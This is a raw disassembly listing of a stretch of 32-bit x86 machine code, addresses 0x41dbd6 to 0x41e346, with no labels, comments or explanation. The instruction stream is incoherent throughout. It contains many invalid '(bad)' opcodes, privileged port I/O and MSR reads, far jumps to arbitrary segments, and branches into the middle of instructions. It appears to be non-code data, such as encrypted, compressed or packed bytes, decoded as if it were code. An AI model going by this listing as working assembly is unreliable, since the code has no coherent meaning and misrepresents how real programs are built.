  41dbd6:	push   edi
  41dbd7:	sbb    dh,bl
  41dbd9:	xchg   esi,eax
  41dbda:	cmp    esp,DWORD PTR [esi-0x32]
  41dbdd:	stc    
  41dbde:	jl     0x41dbc8
  41dbe0:	xchg   ebx,eax
  41dbe1:	or     al,0x7a
  41dbe3:	imul   edi,DWORD PTR [esi-0x6c],0xb8772783
  41dbea:	out    dx,al
  41dbeb:	mov    edx,0x4fc23ffe
  41dbf0:	into   
  41dbf1:	or     al,0x48
  41dbf3:	lock dec eax
  41dbf5:	mov    eax,ds:0x277cf2d6
  41dbfa:	dec    ecx
  41dbfb:	add    DWORD PTR [edx-0x5],0xfffffff6
  41dbff:	cmp    esi,edi
  41dc01:	mov    edi,0xbbe57d
  41dc06:	pop    ds
  41dc07:	lahf   
  41dc08:	imul   ebx,DWORD PTR [edi+eiz*1],0xffffff87
  41dc0c:	push   cs
  41dc0d:	imul   edx,DWORD PTR [ebx],0xfffffffb
  41dc10:	(bad)  
  41dc11:	les    ebp,FWORD PTR [ebx+0xc]
  41dc14:	dec    ecx
  41dc15:	dec    edi
  41dc16:	in     al,dx
  41dc17:	rep outs dx,DWORD PTR ds:[esi]
  41dc19:	sti    
  41dc1a:	inc    esp
  41dc1b:	into   
  41dc1c:	xor    ch,bl
  41dc1e:	mov    esi,ebx
  41dc20:	push   ebp
  41dc21:	sub    bh,BYTE PTR [ebp+eax*4-0x1a]
  41dc25:	aaa    
  41dc26:	adc    al,0x73
  41dc28:	arpl   dx,cx
  41dc2a:	adc    BYTE PTR [ecx+0x199e7f3f],ah
  41dc30:	rol    DWORD PTR [edi],0x89
  41dc33:	aas    
  41dc34:	fdiv   st,st(6)
  41dc36:	ret    0x8a80
  41dc39:	inc    esi
  41dc3a:	push   0xf9880bdf
  41dc3f:	(bad)  
  41dc40:	ins    DWORD PTR es:[edi],dx
  41dc41:	inc    ebp
  41dc42:	rol    DWORD PTR [edx-0x32],cl
  41dc45:	outs   dx,DWORD PTR ds:[esi]
  41dc46:	fstp   QWORD PTR [esi+0x754bc64a]
  41dc4c:	mov    esp,0x890d033b
  41dc51:	bnd jmp 0x41dcb2
  41dc54:	rcr    BYTE PTR [eax-0x5873148],0xd6
  41dc5b:	pop    es
  41dc5c:	mov    ah,0x3e
  41dc5e:	xchg   esi,eax
  41dc5f:	xor    bh,al
  41dc61:	clc    
  41dc62:	inc    ebp
  41dc63:	test   al,0x1a
  41dc65:	out    0x76,al
  41dc67:	sbb    eax,0x41bf0e69
  41dc6c:	fist   WORD PTR [eax-0x26]
  41dc6f:	enter  0x384b,0x41
  41dc73:	pop    edx
  41dc74:	dec    edx
  41dc75:	into   
  41dc76:	retf   
  41dc77:	cmp    DWORD PTR [edi],ecx
  41dc79:	push   ebp
  41dc7a:	push   ebp
  41dc7b:	jb     0x41dc09
  41dc7d:	jg     0x41dc0e
  41dc7f:	inc    eax
  41dc80:	dec    edi
  41dc81:	lock mov esi,0x29b80bb2
  41dc87:	daa    
  41dc88:	and    DWORD PTR [ecx+ebx*1+0x4c19fdbc],edi
  41dc8f:	leave  
  41dc90:	into   
  41dc91:	push   0x14
  41dc93:	xor    al,0xb4
  41dc95:	xor    DWORD PTR [eax-0x53f2446d],esp
  41dc9b:	call   DWORD PTR [esi+0x6361827d]
  41dca1:	push   ds
  41dca2:	push   esp
  41dca3:	mov    al,0xf
  41dca5:	mov    esp,ecx
  41dca7:	and    al,0xdb
  41dca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcaa:	mov    ah,0x3c
  41dcac:	cmp    eax,0x1c1ce5dc
  41dcb1:	sti    
  41dcb2:	push   es
  41dcb3:	outs   dx,BYTE PTR ds:[esi]
  41dcb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcb5:	loopne 0x41dc6c
  41dcb7:	mov    ebx,0x9a693460
  41dcbc:	test   eax,0x2a3dbb65
  41dcc1:	repz push ebp
  41dcc3:	into   
  41dcc4:	fiadd  WORD PTR cs:[edx-0x375659f4]
  41dccb:	mov    edi,0x2813a738
  41dcd0:	fmul   st(1),st
  41dcd2:	pop    esi
  41dcd3:	cmp    al,0x62
  41dcd5:	sub    dl,BYTE PTR [ebx+0x68ffaecc]
  41dcdb:	out    dx,eax
  41dcdc:	into   
  41dcdd:	mov    edi,0x41945780
  41dce2:	or     ecx,DWORD PTR [eax]
  41dce4:	inc    edx
  41dce5:	shl    BYTE PTR [ebp+0x48],cl
  41dce8:	scas   eax,DWORD PTR es:[edi]
  41dce9:	dec    ebx
  41dcea:	shl    edx,cl
  41dcec:	inc    eax
  41dced:	sbb    al,0xb2
  41dcef:	sub    BYTE PTR [ecx],0x55
  41dcf2:	adc    al,0x7b
  41dcf4:	adc    bh,BYTE PTR [esi+0x2adae211]
  41dcfa:	inc    eax
  41dcfb:	push   ebp
  41dcfc:	aam    0x84
  41dcfe:	jl     0x41dd0a
  41dd00:	mov    al,0x7
  41dd02:	mov    edx,0x48b52b75
  41dd07:	mov    eax,ss
  41dd09:	fsubr  QWORD PTR [ebx-0x4b35707d]
  41dd0f:	xlat   BYTE PTR ds:[ebx]
  41dd10:	(bad)  
  41dd11:	and    ah,BYTE PTR [edi]
  41dd13:	jge    0x41dcaa
  41dd15:	or     DWORD PTR [edx-0x32],0x16
  41dd19:	mov    WORD PTR [edx-0x73],es
  41dd1c:	pop    edi
  41dd1d:	push   edi
  41dd1e:	jae    0x41dd6d
  41dd20:	leave  
  41dd21:	xchg   ebx,eax
  41dd22:	cmp    ebp,DWORD PTR [ecx]
  41dd24:	inc    ebx
  41dd25:	scas   al,BYTE PTR es:[edi]
  41dd26:	jnp    0x41dcdc
  41dd28:	leave  
  41dd29:	sub    DWORD PTR [esi+0x3],edi
  41dd2c:	mov    dh,BYTE PTR [esi-0x7c258afc]
  41dd32:	push   0x997b07b6
  41dd37:	inc    edx
  41dd38:	call   0x2987:0x4a69b5f1
  41dd3f:	mov    ch,0x1c
  41dd41:	icebp  
  41dd42:	mov    esi,DWORD PTR [eax+eiz*2+0x469062e7]
  41dd49:	call   0xc82c:0x6bd4c7d1
  41dd50:	jne    0x41dd00
  41dd52:	jp     0x41ddaf
  41dd54:	jp     0x41dd4c
  41dd56:	xor    dx,cx
  41dd59:	push   es
  41dd5a:	popa   
  41dd5b:	or     dl,BYTE PTR [esi]
  41dd5d:	mov    edx,0x642f5df4
  41dd62:	dec    edi
  41dd63:	in     eax,dx
  41dd64:	push   ebx
  41dd65:	imul   edx,DWORD PTR [edx],0xffffffe4
  41dd68:	cs pushf 
  41dd6a:	xchg   ebx,eax
  41dd6b:	cdq    
  41dd6c:	ret    
  41dd6d:	xchg   BYTE PTR [edx],cl
  41dd6f:	cmp    dh,BYTE PTR [ebp+0x71]
  41dd72:	int3   
  41dd73:	mov    WORD PTR [edx+0x387ca6a6],cs
  41dd79:	inc    edx
  41dd7a:	int    0xb9
  41dd7c:	shr    BYTE PTR [eax],0x80
  41dd7f:	push   edx
  41dd80:	mov    WORD PTR [esi-0x15],ss
  41dd83:	mov    esi,0xcf8fdecf
  41dd89:	sar    BYTE PTR fs:[ebx-0x1ebe350a],0x29
  41dd91:	outs   dx,DWORD PTR ds:[esi]
  41dd92:	retf   
  41dd93:	xor    al,0x65
  41dd95:	xchg   edx,eax
  41dd96:	dec    esi
  41dd97:	addr16 nop
  41dd99:	in     al,0xfb
  41dd9b:	retf   0xd147
  41dd9e:	scas   eax,DWORD PTR es:[edi]
  41dd9f:	add    al,0xca
  41dda1:	xor    BYTE PTR [edi+0x19],bh
  41dda4:	jmp    0x41de09
  41dda6:	scas   al,BYTE PTR es:[edi]
  41dda7:	lock add DWORD PTR [ebx+0x1f],0x40
  41ddac:	ror    DWORD PTR [edx-0x43],cl
  41ddaf:	repz add esi,edi
  41ddb2:	dec    ecx
  41ddb3:	pop    eax
  41ddb4:	daa    
  41ddb5:	retf   0x872a
  41ddb8:	call   0x4a18:0xa0712779
  41ddbf:	jmp    0x8f85:0xc22af13a
  41ddc6:	dec    esi
  41ddc7:	mov    al,ds:0x1bc7eb34
  41ddcc:	popf   
  41ddcd:	sbb    ebp,DWORD PTR [ebp+ebp*2+0x4c92e40]
  41ddd4:	mov    BYTE PTR [eax-0x7af9deea],bh
  41ddda:	stc    
  41dddb:	es push cs
  41dddd:	ret    0x12f9
  41dde0:	mov    al,bh
  41dde2:	lds    ecx,FWORD PTR [eax-0x4f5117b0]
  41dde8:	int3   
  41dde9:	jnp    0x41de4b
  41ddeb:	shl    DWORD PTR [esi+0x48],1
  41ddee:	xchg   ebx,eax
  41ddef:	repz not BYTE PTR [edx+0x75ba50d5]
  41ddf6:	jmp    0x41ddcc
  41ddf8:	ret    
  41ddf9:	cmp    cl,BYTE PTR [eax+esi*1+0x79528e77]
  41de00:	test   eax,0xfde0b55c
  41de05:	lods   eax,DWORD PTR ds:[esi]
  41de06:	xor    al,0x8
  41de08:	mov    eax,0x7f736b3e
  41de0d:	(bad)  [eax+0x6c6825d3]
  41de13:	aam    0xe0
  41de15:	out    dx,al
  41de16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de17:	je     0x41de57
  41de19:	cdq    
  41de1a:	mov    cl,0xe
  41de1c:	mov    ?,WORD PTR [esi+0x6c]
  41de1f:	cmp    DWORD PTR [esp+edi*1-0x64],edi
  41de23:	jmp    FWORD PTR ds:0xbeece5
  41de29:	cmc    
  41de2a:	push   ds
  41de2b:	xor    DWORD PTR [eax+0x2d20b294],ebx
  41de31:	scas   al,BYTE PTR es:[edi]
  41de32:	or     al,0xe9
  41de34:	ins    BYTE PTR es:[edi],dx
  41de35:	sub    eax,0x6664669d
  41de3a:	mov    bh,BYTE PTR [ecx]
  41de3c:	int3   
  41de3d:	in     eax,0x32
  41de3f:	mov    bh,0x8d
  41de41:	sbb    DWORD PTR [ebp+0x4aa333b2],ebx
  41de47:	inc    ecx
  41de48:	push   0x4ee75796
  41de4d:	in     eax,0x4
  41de4f:	clc    
  41de50:	iret   
  41de51:	sub    ecx,DWORD PTR [esi]
  41de53:	sbb    BYTE PTR [edx+edx*1-0x5bd3a47c],cl
  41de5a:	call   0x1bb75103
  41de5f:	push   ecx
  41de60:	pop    esi
  41de61:	jno    0x41de55
  41de63:	push   esp
  41de64:	mov    cl,BYTE PTR [edx-0x195cb859]
  41de6a:	sbb    DWORD PTR ds:0xf6dbbe20,ebx
  41de70:	ret    0xe316
  41de73:	mov    ah,0x99
  41de75:	dec    ecx
  41de76:	xor    DWORD PTR [eax+ebp*2-0x7e],0xc0680320
  41de7e:	mov    bh,0xf9
  41de80:	sbb    esi,edx
  41de82:	lahf   
  41de83:	jge    0x41dea1
  41de85:	scas   eax,DWORD PTR es:[edi]
  41de86:	pop    es
  41de87:	shl    edx,0x5e
  41de8a:	outs   dx,BYTE PTR ds:[esi]
  41de8b:	enter  0xc998,0x1f
  41de8f:	push   cs
  41de90:	push   ss
  41de91:	lahf   
  41de92:	in     al,dx
  41de93:	pop    ebx
  41de94:	cld    
  41de95:	aam    0xf4
  41de97:	pusha  
  41de98:	out    0x2c,eax
  41de9a:	dec    edi
  41de9b:	jecxz  0x41deb8
  41de9d:	fs ss sbb al,0xc0
  41dea1:	out    0xd2,al
  41dea3:	mov    DWORD PTR [esi-0x10],ebp
  41dea6:	sahf   
  41dea7:	leave  
  41dea8:	int3   
  41dea9:	pop    eax
  41deaa:	fistp  WORD PTR [edi+edx*2-0x45]
  41deae:	sahf   
  41deaf:	aaa    
  41deb0:	ds pop ds
  41deb2:	mov    DWORD PTR [edx+0x3b],ebp
  41deb5:	(bad)  
  41deb6:	aad    0xae
  41deb8:	push   esi
  41deb9:	dec    ebx
  41deba:	push   edx
  41debb:	jae    0x41de99
  41debd:	adc    BYTE PTR [esi],bl
  41debf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec0:	out    0xc8,eax
  41dec2:	test   BYTE PTR [ecx-0x23],dh
  41dec5:	(bad)  [esi-0x3]
  41dec8:	retf   0xa3a1
  41decb:	cmp    al,0x6d
  41decd:	fsubrp st(3),st
  41decf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ded0:	mov    edi,0x4d8713d1
  41ded5:	or     esp,DWORD PTR [eax+0x71e4e4a2]
  41dedb:	and    eax,0x46869e31
  41dee0:	das    
  41dee1:	xchg   edx,eax
  41dee2:	adc    eax,0xeb0c9e65
  41dee7:	sbb    eax,0x38bf174b
  41deec:	jnp    0x41df0f
  41deee:	xchg   esp,eax
  41deef:	lods   eax,DWORD PTR ds:[esi]
  41def0:	or     ecx,DWORD PTR [ebx-0x61]
  41def3:	pop    ebp
  41def4:	scas   eax,DWORD PTR es:[edi]
  41def5:	mov    ds:0x353b07a8,eax
  41defa:	add    ecx,DWORD PTR [ebp-0x53afc3d1]
  41df00:	stc    
  41df01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df02:	mov    esp,0x2cedca74
  41df07:	xchg   esp,eax
  41df08:	mov    ecx,0x8c23e53
  41df0d:	test   bl,0x6e
  41df10:	aaa    
  41df11:	(bad)  
  41df12:	mov    edi,0xa6447e39
  41df17:	addr16 mov bh,0x9d
  41df1a:	sbb    BYTE PTR [edi+eax*8],ch
  41df1d:	dec    esi
  41df1e:	std    
  41df1f:	retf   
  41df20:	push   eax
  41df21:	aad    0x49
  41df23:	repz inc esi
  41df25:	sub    BYTE PTR [edx+0x7474d9a8],ch
  41df2b:	push   es
  41df2c:	xor    BYTE PTR [esi],bh
  41df2e:	add    eax,0x49277e58
  41df33:	(bad)  
  41df34:	div    DWORD PTR [ebx-0x23b93831]
  41df3a:	cmc    
  41df3b:	aas    
  41df3c:	or     al,0xab
  41df3e:	call   0x3d61:0x8890bb9d
  41df45:	dec    ebx
  41df46:	test   al,0xd0
  41df48:	rcl    al,1
  41df4a:	fsubrp st(0),st
  41df4c:	add    BYTE PTR [eax],al
  41df4e:	mov    esp,0x99037d4c
  41df53:	pop    ebp
  41df54:	repz popf 
  41df56:	xor    eax,0xdb302db0
  41df5b:	stos   DWORD PTR es:[edi],eax
  41df5c:	lock outs dx,BYTE PTR ds:[esi]
  41df5e:	pop    edx
  41df5f:	jecxz  0x41def1
  41df61:	(bad)  
  41df63:	scas   al,BYTE PTR es:[edi]
  41df64:	ins    DWORD PTR es:[edi],dx
  41df65:	js     0x41dfb1
  41df67:	jnp    0x41df68
  41df69:	jne    0x41df2c
  41df6b:	ins    BYTE PTR es:[edi],dx
  41df6c:	idiv   ah
  41df6e:	out    dx,al
  41df6f:	inc    edx
  41df70:	aad    0x2b
  41df72:	dec    edx
  41df73:	adc    BYTE PTR [esi+0x6c4225d8],al
  41df79:	mov    ds:0xd9088a35,al
  41df7e:	or     eax,0x8a6b71e0
  41df83:	xchg   esi,eax
  41df84:	shr    DWORD PTR [si-0x76ec],1
  41df89:	add    BYTE PTR [esi],0x7
  41df8c:	int    0x6e
  41df8e:	or     al,0xe4
  41df90:	mov    dh,0x97
  41df92:	xor    ebx,DWORD PTR ds:0x580f72ab
  41df98:	js     0x41df7d
  41df9a:	mov    bl,0x63
  41df9c:	ror    ah,0x2b
  41df9f:	lock jmp 0x41df35
  41dfa2:	inc    DWORD PTR [ebp-0x9b944ce]
  41dfa8:	jecxz  0x41df7d
  41dfaa:	mov    BYTE PTR [eax+0x51d17788],bh
  41dfb0:	outs   dx,BYTE PTR ds:[esi]
  41dfb1:	nop
  41dfb2:	jb     0x41dfd9
  41dfb4:	fwait
  41dfb5:	sub    eax,0x702a2882
  41dfba:	cmp    BYTE PTR [eax+esi*4-0x2ad8888c],0x1f
  41dfc2:	fidivr WORD PTR [esi-0x58e6dd25]
  41dfc8:	mov    cl,BYTE PTR [esi]
  41dfca:	mov    cs,WORD PTR [ecx]
  41dfcc:	ja     0x41e047
  41dfce:	lock ret 0x6491
  41dfd2:	test   eax,0x837395b
  41dfd7:	cmp    DWORD PTR [esi+0x52],esp
  41dfda:	in     eax,0x72
  41dfdc:	jl     0x41df64
  41dfde:	xchg   ebp,eax
  41dfdf:	cs and esp,ebp
  41dfe2:	int3   
  41dfe3:	les    esp,FWORD PTR [esi]
  41dfe5:	stos   DWORD PTR es:[edi],eax
  41dfe6:	cmp    al,0xc5
  41dfe8:	xlat   BYTE PTR ds:[ebx]
  41dfe9:	xchg   ebx,eax
  41dfea:	xor    esp,ebp
  41dfec:	fwait
  41dfed:	leave  
  41dfee:	in     eax,dx
  41dfef:	stos   DWORD PTR es:[edi],eax
  41dff0:	add    DWORD PTR [edi+ecx*4],0x12e97472
  41dff7:	and    BYTE PTR [ebp-0x77],al
  41dffa:	inc    ebx
  41dffb:	inc    esi
  41dffc:	sub    eax,0x3e091c7d
  41e001:	mov    DWORD PTR [ebx],edx
  41e003:	and    eax,0x1c54c5f1
  41e008:	dec    edi
  41e009:	xor    dl,BYTE PTR [eax-0x65835a83]
  41e00f:	outs   dx,DWORD PTR ds:[esi]
  41e010:	jmp    0xefd1:0x408632aa
  41e017:	sub    eax,0x1be5329c
  41e01c:	push   edi
  41e01d:	rol    BYTE PTR [eax-0x9],cl
  41e020:	inc    esi
  41e021:	cld    
  41e022:	sbb    al,0xe9
  41e024:	jecxz  0x41e03c
  41e026:	retf   
  41e027:	adc    esp,ebp
  41e029:	fwait
  41e02a:	dec    eax
  41e02b:	or     BYTE PTR [esi-0x42a778fe],bl
  41e031:	xchg   esp,eax
  41e032:	add    bh,cl
  41e034:	ret    0x365
  41e037:	sbb    BYTE PTR [edi+0x6ab8cd47],dl
  41e03d:	sbb    ecx,DWORD PTR [edx]
  41e03f:	push   0xffffffcc
  41e041:	mov    cl,0xfb
  41e043:	and    al,0xc9
  41e045:	out    0x9e,al
  41e047:	sbb    esi,edx
  41e049:	mov    edx,0xcfeec19
  41e04e:	xor    dl,BYTE PTR [edi+edx*1-0x129694da]
  41e055:	leave  
  41e056:	add    DWORD PTR [ecx],esp
  41e058:	or     eax,0x81845274
  41e05d:	jne    0x41e080
  41e05f:	ret    
  41e060:	xchg   esp,eax
  41e061:	inc    ebp
  41e062:	(bad)  
  41e063:	mov    ebx,0xe6fb626
  41e068:	sub    dl,al
  41e06a:	pop    es
  41e06b:	cld    
  41e06c:	xor    DWORD PTR [ebp+0x60],esp
  41e06f:	pop    edx
  41e070:	lods   eax,DWORD PTR ds:[esi]
  41e071:	repnz icebp 
  41e073:	dec    eax
  41e074:	mov    dh,0xfb
  41e076:	arpl   WORD PTR [edx],si
  41e078:	in     al,0x10
  41e07a:	jo     0x41e0e3
  41e07c:	xchg   esp,eax
  41e07d:	fadd   st,st(2)
  41e07f:	out    0x1f,eax
  41e081:	or     dl,BYTE PTR ds:0xef1829fc
  41e087:	stc    
  41e088:	sbb    edx,DWORD PTR [eax]
  41e08a:	int3   
  41e08b:	push   edi
  41e08c:	jne    0x41e0b8
  41e08e:	fdiv   DWORD PTR cs:[ebp+0x2af0e3f1]
  41e095:	push   ebp
  41e096:	mov    ch,0xd0
  41e098:	imul   edi,DWORD PTR ds:0x5a023b7f,0xd9c9311a
  41e0a2:	or     esp,esp
  41e0a4:	pop    ebp
  41e0a5:	mov    bh,0x12
  41e0a7:	addr16 sbb eax,esp
  41e0aa:	xchg   ecx,eax
  41e0ab:	jnp    0x41e122
  41e0ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0ae:	imul   esi,DWORD PTR [esi-0x77c3e0cb],0x13
  41e0b5:	mov    ebx,0x60a511c7
  41e0ba:	popf   
  41e0bb:	dec    ebx
  41e0bc:	or     eax,ecx
  41e0be:	imul   ecx,ecx,0xffffff96
  41e0c1:	and    ebx,DWORD PTR [ebx+0x7f2f539a]
  41e0c7:	neg    DWORD PTR [esp+edi*2]
  41e0ca:	pop    ebx
  41e0cb:	js     0x41e080
  41e0cd:	inc    edi
  41e0ce:	in     al,0xba
  41e0d0:	(bad)  
  41e0d1:	jecxz  0x41e0cb
  41e0d3:	jmp    0x61e6:0xa7a5eac7
  41e0da:	jl     0x41e120
  41e0dc:	ja     0x41e114
  41e0de:	xchg   dl,ah
  41e0e0:	int3   
  41e0e1:	xchg   ebp,eax
  41e0e2:	or     eax,DWORD PTR [edi+0x773ddcc0]
  41e0e8:	xchg   edi,eax
  41e0e9:	ret    
  41e0ea:	fwait
  41e0eb:	sti    
  41e0ec:	call   0x7d915709
  41e0f1:	aad    0x80
  41e0f3:	or     BYTE PTR [ebx+0x22fff9dd],0xb5
  41e0fa:	mov    cs,WORD PTR [edi-0x40]
  41e0fd:	xchg   esi,eax
  41e0fe:	in     eax,0xf4
  41e100:	push   0x23
  41e102:	cmp    cl,0x59
  41e105:	loopne 0x41e0b5
  41e107:	cmp    cl,BYTE PTR [ecx]
  41e109:	ret    0x9482
  41e10c:	jmp    0x41e0f3
  41e10e:	mov    ds:0xd211a007,al
  41e113:	mov    dl,0x16
  41e115:	popa   
  41e116:	nop
  41e117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e118:	push   0xa8cfe97b
  41e11d:	inc    esi
  41e11e:	stc    
  41e11f:	ret    0xd42e
  41e122:	data16 (bad) 
  41e125:	sbb    bh,BYTE PTR [edx]
  41e127:	pop    ecx
  41e128:	mov    edx,0xd83b3901
  41e12d:	pop    ds
  41e12e:	into   
  41e12f:	xor    DWORD PTR [eax-0x57],edx
  41e132:	push   es
  41e133:	or     ecx,DWORD PTR [ebp+0x7e]
  41e136:	mov    esp,0x49107229
  41e13b:	mov    ah,0x67
  41e13d:	push   edx
  41e13e:	sub    BYTE PTR [ecx],al
  41e140:	pop    edi
  41e141:	dec    esp
  41e142:	in     al,dx
  41e143:	jmp    0x41e144
  41e145:	sbb    al,0x22
  41e147:	xor    eax,0x2aca968e
  41e14c:	push   ss
  41e14d:	out    0x29,eax
  41e14f:	test   edx,0x8ee2e178
  41e155:	push   0x675f9db9
  41e15a:	in     eax,0xbd
  41e15c:	and    DWORD PTR [ebx],0xffffffb4
  41e15f:	jle    0x41e0f0
  41e161:	and    DWORD PTR [esp+esi*8-0x3ac84204],esi
  41e168:	mov    ebp,0x3a604bbe
  41e16d:	xor    al,0x4c
  41e16f:	mov    ds:0xd61580e3,eax
  41e174:	pop    ebx
  41e175:	pop    ebx
  41e176:	iret   
  41e177:	jmp    0xd9938741
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	lea    edx,[ebp+0x69]
  41e180:	mov    dl,0x5f
  41e182:	lahf   
  41e183:	dec    edi
  41e184:	mov    BYTE PTR [ebx-0x5c0d7c5b],bh
  41e18a:	ins    BYTE PTR es:[edi],dx
  41e18b:	ins    DWORD PTR es:[edi],dx
  41e18c:	cmc    
  41e18d:	ja     0x41e1e9
  41e18f:	sbb    al,BYTE PTR [ebp+0x3cafc065]
  41e195:	ror    esp,cl
  41e197:	push   ss
  41e198:	fild   DWORD PTR [ebx+edx*4-0x78a66ccb]
  41e19f:	mov    esp,0x6120c3d9
  41e1a4:	push   es
  41e1a5:	sbb    ebp,DWORD PTR [edx]
  41e1a7:	push   ebx
  41e1a8:	shl    BYTE PTR [eax-0x76],0xf
  41e1ac:	or     esp,DWORD PTR [ecx-0x4f29156c]
  41e1b2:	sub    DWORD PTR [edi+ecx*1],0x6
  41e1b6:	sar    DWORD PTR [edi+0x2a],1
  41e1b9:	inc    ecx
  41e1ba:	stos   BYTE PTR es:[edi],al
  41e1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1bc:	pop    esi
  41e1bd:	xlat   BYTE PTR es:[ebx]
  41e1bf:	adc    ch,BYTE PTR [eax+esi*2-0x5fd1645e]
  41e1c6:	daa    
  41e1c7:	neg    DWORD PTR [edx]
  41e1c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1ca:	jb     0x41e165
  41e1cc:	push   esp
  41e1cd:	pop    ecx
  41e1ce:	mov    BYTE PTR [edx+0x2933108c],bh
  41e1d4:	(bad)  
  41e1d5:	std    
  41e1d6:	xchg   esi,eax
  41e1d7:	push   0x17
  41e1d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1da:	push   eax
  41e1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1dd:	fisubr DWORD PTR [eax+0x7e]
  41e1e0:	sub    BYTE PTR [edx],dl
  41e1e2:	sti    
  41e1e3:	xor    DWORD PTR [eax-0x5e],ebp
  41e1e6:	add    BYTE PTR [edx],al
  41e1e8:	and    DWORD PTR [edi],esi
  41e1ea:	inc    ebx
  41e1eb:	jle    0x41e1ba
  41e1ed:	mov    DWORD PTR [edx+0x2032b248],ebx
  41e1f3:	jnp    0x41e17c
  41e1f5:	xchg   esp,eax
  41e1f6:	mov    BYTE PTR [edi+0x32d4c37f],cl
  41e1fc:	jno    0x41e188
  41e1fe:	pop    esi
  41e1ff:	mov    dh,0x62
  41e201:	fsubrp st(2),st
  41e203:	and    BYTE PTR [esp+edx*1+0x35b4fb17],cl
  41e20a:	popa   
  41e20b:	ins    DWORD PTR es:[edi],dx
  41e20c:	jmp    0x41e25e
  41e20e:	mov    dh,BYTE PTR [esi+ebx*2]
  41e211:	pop    eax
  41e212:	sar    DWORD PTR [edx-0x172d006d],1
  41e218:	loop   0x41e1be
  41e21a:	mov    eax,0x3d579f11
  41e21f:	sbb    eax,0x455bacc2
  41e224:	es lock pop edx
  41e227:	pop    ebp
  41e228:	ds inc eax
  41e22a:	add    al,0x85
  41e22c:	lods   eax,DWORD PTR ds:[esi]
  41e22d:	stc    
  41e22e:	mov    edi,0x58dc4623
  41e233:	lds    esi,FWORD PTR [ebp-0x15604f6c]
  41e239:	xchg   edi,eax
  41e23a:	mov    cl,0x25
  41e23c:	pop    ebx
  41e23d:	inc    esi
  41e23e:	ins    DWORD PTR es:[edi],dx
  41e23f:	xchg   esp,eax
  41e240:	dec    esi
  41e241:	jns    0x41e29c
  41e243:	push   ecx
  41e244:	cmp    bp,WORD PTR [edi-0x321fdaf4]
  41e24b:	pushf  
  41e24c:	lock inc esi
  41e24e:	push   ds
  41e24f:	lock sar BYTE PTR [ebp-0x4107d4bc],cl
  41e256:	pop    esi
  41e257:	lahf   
  41e258:	bound  ecx,QWORD PTR [eax-0x541a0c3e]
  41e25e:	call   0x618e3b92
  41e263:	imul   DWORD PTR [ecx+edx*8+0xa8bb434]
  41e26a:	inc    ebx
  41e26b:	and    eax,0xcb491090
  41e270:	inc    eax
  41e271:	aad    0xd8
  41e273:	ins    DWORD PTR es:[edi],dx
  41e274:	pop    edx
  41e275:	arpl   WORD PTR [eax-0x1cc2410f],cx
  41e27b:	xchg   ebp,edx
  41e27d:	scas   al,BYTE PTR es:[edi]
  41e27e:	test   ah,bl
  41e280:	sbb    al,BYTE PTR [edx-0x54]
  41e283:	lock test BYTE PTR [eax+0x3eb05a8d],bl
  41e28a:	inc    ecx
  41e28b:	cmp    BYTE PTR [eax-0x3fe6aaa1],dh
  41e291:	(bad)  
  41e292:	ffreep st(5)
  41e294:	dec    esi
  41e295:	mov    ch,0x91
  41e297:	push   ebp
  41e298:	add    eax,ebx
  41e29a:	fnsave [edi-0xac2516b]
  41e2a0:	mov    ebp,0xbfcfb90f
  41e2a5:	sahf   
  41e2a6:	push   ebp
  41e2a7:	call   0xee09:0xa64734e1
  41e2ae:	sahf   
  41e2af:	xchg   ecx,eax
  41e2b0:	(bad)  
  41e2b1:	cmc    
  41e2b2:	stos   DWORD PTR es:[edi],eax
  41e2b3:	std    
  41e2b4:	clc    
  41e2b5:	pop    ebp
  41e2b6:	in     eax,0x81
  41e2b8:	cmp    BYTE PTR [eax-0x14800600],dh
  41e2be:	(bad)  
  41e2bf:	push   0x71bef325
  41e2c4:	pusha  
  41e2c5:	lds    ebx,FWORD PTR [ebx+0x7b]
  41e2c8:	sti    
  41e2c9:	imul   edi,DWORD PTR [edi+ebp*8-0x76cc9c62],0xd2dfb407
  41e2d4:	fwait
  41e2d5:	sub    dl,ah
  41e2d7:	push   0xffffffe7
  41e2d9:	das    
  41e2da:	fbstp  TBYTE PTR [edi+0x10]
  41e2dd:	sub    al,BYTE PTR [ebp+0x1598106]
  41e2e3:	mov    ecx,0x728cd93a
  41e2e8:	adc    BYTE PTR [ebp+0x54],cl
  41e2eb:	and    BYTE PTR [edi+0xb],ch
  41e2ee:	in     al,dx
  41e2ef:	pop    esp
  41e2f0:	int    0x4f
  41e2f2:	int    0x25
  41e2f4:	test   BYTE PTR [edi],cl
  41e2f6:	rdmsr  
  41e2f8:	fist   DWORD PTR [esi+0x596f1b55]
  41e2fe:	jp     0x41e32c
  41e300:	ins    BYTE PTR es:[edi],dx
  41e301:	mov    ss,WORD PTR [edi-0x28045fcd]
  41e307:	mov    dh,0xe1
  41e309:	pusha  
  41e30a:	cmp    eax,0xf8508fab
  41e30f:	pop    es
  41e310:	test   al,0xb8
  41e312:	push   0xa14d4821
  41e317:	test   DWORD PTR [esi+0x33ff4ac8],edx
  41e31d:	leave  
  41e31e:	repz in eax,dx
  41e320:	ss adc al,0x1e
  41e323:	(bad)  
  41e324:	push   esi
  41e325:	or     ebx,DWORD PTR [esi]
  41e327:	ins    DWORD PTR es:[edi],dx
  41e328:	jae    0x41e2ba
  41e32a:	xor    al,0x63
  41e32c:	das    
  41e32d:	mov    ebp,0x50b5768f
  41e332:	sub    ah,cl
  41e334:	sbb    al,0xd7
  41e336:	sbb    BYTE PTR [edx+0x4bf32d31],ch
  41e33c:	(bad)  
  41e33d:	loopne 0x41e30e
  41e33f:	test   BYTE PTR [ebp+0x6d],al
  41e342:	ds pop ebp
  41e344:	jnp    0x41e39b
  41e346:	test   eax,0x5a801faa
